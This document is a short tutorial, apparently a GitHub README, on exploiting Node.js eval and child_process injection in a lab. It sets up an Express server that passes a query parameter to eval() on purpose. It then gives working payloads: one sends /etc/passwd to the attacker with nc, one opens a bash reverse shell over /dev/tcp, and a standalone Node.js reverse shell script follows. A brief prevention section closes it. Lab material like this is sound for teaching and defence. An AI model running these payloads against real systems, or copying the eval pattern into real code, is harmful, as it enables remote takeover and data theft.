# NodeJS-Exploitation
Basic NodeJS Exploitation for data exfiltration and reverse shells

Node.js is an open-source, cross-platform, back-end, JavaScript runtime environment that executes JavaScript code outside a web browser.

NodeJS "child_process" allow the application to create a child process and access the underlying operating system functionalities by running any system command inside the child process

There are four different ways to create a child process in Node:

- spawn()
- fork()
- exec()
- execFile()

child_process.exec() = Used to spawn a shell and execute system level command. It stores output in a buffer , used by developers when not expecting large amounts of data to be returned

child_process.spawn() = Function executes a command in a new process. Used by developers when expecting a large amount of output from your command

Basic Lab Setup

Victim IP   ::: 192.168.10.100

Attacker IP ::: 192.168.10.10

Make sure to replace the attacker ip where necessary to get the call back to your system

Victim 

Installing package dependencies
```
apt-get install nodejs
apt install nodejs-legacy
apt-get install npm
npm install express

```
Create new file called app.js with the below content
```
var express = require('express');
var app = express();
app.get('/', function (req, res) {
    res.send('Hello ' + eval(req.query.q));
    console.log(req.query.q);
});
app.listen(8080, function () {
    console.log('app listening on port 8080!');
});
```
Run the app
```
node app.js
```

Open the app
```
http://192.168.10.100:8080
```
Attacker

Pass it user input
```
http://192.168.10.100:8080/?q='Test'
```

Exfiltrate the /etc/passwd file of the remote system

```
http://192.168.10.100:8080/?q=require('child_process').exec('cat+/etc/passwd+|+nc+192.168.10.10+9999')
```

Obtain Reverse Shell

```
http://192.168.10.100:8080/?q=require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.10.10/9999 0>%261"')
nc -lvnp 9999
```
NodeJS Reverse Shell Code (Script)

Below is an example of a simple reverse shell coded in NodeJS
```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9999, "192.168.10.10", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; 
})();

```

# How to prevent NodeJS command injection attacks

- Never accept user input from the public and pass it to child_process.exec()
- Try to avoid letting users pass in options to commands if possible. Typically values are okay when using spawn or execfile, but selecting options via a user controlled string   is a bad idea
- If you must allow for user controlled options, look at the options for the command extensively, determine which options are safe, and whitelist only those options
- Use execfile() or spawn() to seperate the command and its arguments. It prevents malicious user input from running subcommands inside a shell enviroment. However the linux       find command has the ability to read/write to files , which means that the linux find comamnd can still be abused for data exfiltration and the -exec argument for code           Execution





